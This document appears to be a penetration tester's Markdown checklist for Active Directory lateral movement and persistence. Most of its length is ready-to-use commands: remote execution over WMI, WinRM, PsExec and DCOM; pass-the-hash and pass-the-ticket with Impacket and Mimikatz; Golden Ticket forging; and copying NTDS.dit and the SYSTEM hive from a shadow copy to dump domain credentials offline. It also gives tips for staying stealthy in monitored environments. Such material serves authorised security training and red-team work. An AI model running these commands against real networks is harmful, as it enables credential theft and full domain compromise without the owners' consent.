# Active Directory Lateral Movement & Persistence - AD Pentesting Checklist & Commands

## üéØ What am I realistically expecting to achieve here?

‚≠ê After gaining a foothold in an AD environment, I realistically expect to:

- [ ] Move laterally to other systems without cracking passwords
- [ ] Execute commands remotely via WMI, WinRM, PsExec, or DCOM
- [ ] Leverage stolen credentials or hashes for further compromise
- [ ] Abuse Kerberos tickets for authentication (Pass-the-Ticket / Overpass-the-Hash)
- [ ] Maintain long-term access using persistence techniques (Golden Ticket, Shadow Copies)
- [ ] Extract credential material from AD (NTDS.dit, SYSTEM hive)
- [ ] Gain Domain Admin or equivalent privileges

---

## ‚úÖ 1. WMI-Based Lateral Movement

- [ ] **Command-Line WMI Execution**
    ```bash
    # Spawn process remotely
    wmic /node:<TARGET_IP> /user:<USERNAME> /password:<PASSWORD> process call create "calc"
    ```

- [ ] **PowerShell WMI (CIM Session)**
    ```powershell
    $username = 'USERNAME';
    $password = 'PASSWORD';
    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

    $options = New-CimSessionOption -Protocol DCOM
    $session = New-Cimsession -ComputerName <TARGET_IP> -Credential $credential -SessionOption $Options
    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc"}
    ```

- [ ] **Reverse Shell Payload**
    - Encode with Python:
        ```bash
        python3 encode.py
        ```
    - Use in PowerShell:
        ```powershell
        Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}
        ```

---

## ‚úÖ 2. WinRM / WinRS Lateral Movement

- [ ] **WinRS (Remote Command Execution)**
    ```cmd
    winrs -r:<TARGET_HOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
    ```

- [ ] **PowerShell Remoting**
    ```powershell
    $username = 'USERNAME';
    $password = 'PASSWORD';
    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

    $session = New-PSSession -ComputerName <TARGET_IP> -Credential $credential
    Enter-PSSession $session
    ```

---

## ‚úÖ 3. PsExec Execution

- [ ] **PsExec Interactive Session**
    ```cmd
    PsExec64.exe -i \\<TARGET_HOST> -u <DOMAIN>\<USER> -p <PASSWORD> cmd
    ```

---

## ‚úÖ 4. Pass the Hash (PtH)

- [ ] **Impacket wmiexec**
    ```bash
    impacket-wmiexec -hashes :<NTLM_HASH> <USERNAME>@<TARGET_IP>
    ```

---

## ‚úÖ 5. Overpass the Hash

- [ ] **Mimikatz sekurlsa::pth**
    ```cmd
    sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell
    ```

- [ ] **Verify Kerberos Tickets**
    ```cmd
    klist
    ```

---

## ‚úÖ 6. Pass the Ticket

- [ ] **Export Tickets with Mimikatz**
    ```cmd
    sekurlsa::tickets /export
    ```

- [ ] **Inject Ticket**
    ```cmd
    kerberos::ptt <ticket.kirbi>
    ```

---

## ‚úÖ 7. DCOM Lateral Movement

- [ ] **MMC Application Abuse**
    ```powershell
    $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>"))
    $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
    ```

---

## ‚úÖ 8. Persistence Techniques

- [ ] **Golden Ticket**
    ```cmd
    kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
    ```

- [ ] **Shadow Copies**
    ```cmd
    vshadow.exe -nw -p C:
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit C:\ntds.dit.bak
    reg.exe save hklm\system c:\system.bak
    ```

- [ ] **Dump Credentials Offline**
    ```bash
    impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
    ```

---

## ‚úÖ Quick References

- **Ports Used**
    - WMI: TCP 135 + High Ports
    - WinRM: 5985 (HTTP), 5986 (HTTPS)
    - PsExec & PtH: TCP 445 (SMB)
    - DCOM: TCP 135
- **Tools**
    - Mimikatz
    - Impacket
    - PsExec
    - vshadow.exe

---

### üîç Key Notes
- Always ensure target allows required services (WinRM, SMB)
- Use Kerberos where possible for stealth
- Prefer ticket-based over hash-based methods in monitored environments

---
